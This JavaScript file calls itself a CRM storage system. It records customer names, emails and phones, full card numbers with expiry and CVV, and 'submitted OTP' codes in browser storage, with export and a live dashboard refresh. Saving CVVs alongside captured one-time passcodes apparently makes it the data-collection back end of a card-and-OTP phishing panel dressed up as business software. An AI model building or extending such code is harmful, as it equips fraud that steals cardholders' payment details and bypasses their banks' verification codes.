// CRM Storage System
class CRMStorage {
  constructor() {
    this.initializeStorage();
  }

  initializeStorage() {
    if (!localStorage.getItem('crmData')) {
      const initialData = {
        orders: [],
        cards: [],
        otp: [],
        settings: {
          autoSave: true,
          lastBackup: null
        }
      };
      localStorage.setItem('crmData', JSON.stringify(initialData));
    }
  }

  getData() {
    try {
      return JSON.parse(localStorage.getItem('crmData') || '{"orders":[],"cards":[],"otp":[]}');
    } catch (e) {
      console.error('Error reading CRM data:', e);
      return { orders: [], cards: [], otp: [] };
    }
  }

  saveData(data) {
    try {
      localStorage.setItem('crmData', JSON.stringify(data));
      return true;
    } catch (e) {
      console.error('Error saving CRM data:', e);
      return false;
    }
  }

  addOrder(orderData) {
    const data = this.getData();
    const order = {
      id: this.generateId(),
      timestamp: new Date().toISOString(),
      fullName: orderData.fullName,
      email: orderData.email,
      phone: orderData.phone,
      orderTotal: orderData.orderTotal,
      status: 'Completed'
    };
    data.orders.unshift(order);
    this.saveData(data);
    console.log('Order added to CRM:', order);
    return order;
  }

  addCardDetails(cardData) {
    const data = this.getData();
    const card = {
      id: this.generateId(),
      timestamp: new Date().toISOString(),
      cardName: cardData.cardName,
      cardNumber: cardData.cardNumber,
      expiry: cardData.expiry,
      cvv: cardData.cvv,
      status: 'Received'
    };
    data.cards.unshift(card);
    this.saveData(data);
    console.log('Card details added to CRM:', card);
    return card;
  }

  addOTPData(otpData) {
    const data = this.getData();
    const otp = {
      id: this.generateId(),
      timestamp: new Date().toISOString(),
      submittedOTP: otpData.submittedOTP,
      email: otpData.email,
      phone: otpData.phone,
      status: 'Verified'
    };
    data.otp.unshift(otp);
    this.saveData(data);
    console.log('OTP data added to CRM:', otp);
    return otp;
  }

  generateId() {
    return Date.now().toString(36) + Math.random().toString(36).substr(2);
  }

  exportData() {
    const data = this.getData();
    const dataStr = JSON.stringify(data, null, 2);
    const blob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'crm_data_' + new Date().toISOString().split('T')[0] + '.json';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

  clearAllData() {
    const initialData = {
      orders: [],
      cards: [],
      otp: [],
      settings: {
        autoSave: true,
        lastBackup: null
      }
    };
    this.saveData(initialData);
  }

  getStats() {
    const data = this.getData();
    return {
      totalOrders: data.orders.length,
      totalCards: data.cards.length,
      totalOTP: data.otp.length,
      successRate: data.otp.length > 0 ? 100 : 0
    };
  }
}

// Global CRM instance
window.crmStorage = new CRMStorage();

// Global functions for backward compatibility
window.addOrder = function(data) {
  return window.crmStorage.addOrder(data);
};

window.addCardDetails = function(data) {
  return window.crmStorage.addCardDetails(data);
};

window.addOTPData = function(data) {
  return window.crmStorage.addOTPData(data);
};

// Auto-refresh CRM dashboard if it's open
if (window.location.pathname.includes('crm.html')) {
  setInterval(() => {
    if (typeof updateCRMStats === 'function') {
      updateCRMStats();
    }
    if (typeof renderCRMTables === 'function') {
      renderCRMTables();
    }
  }, 1000);
}

console.log('CRM Storage System initialized');
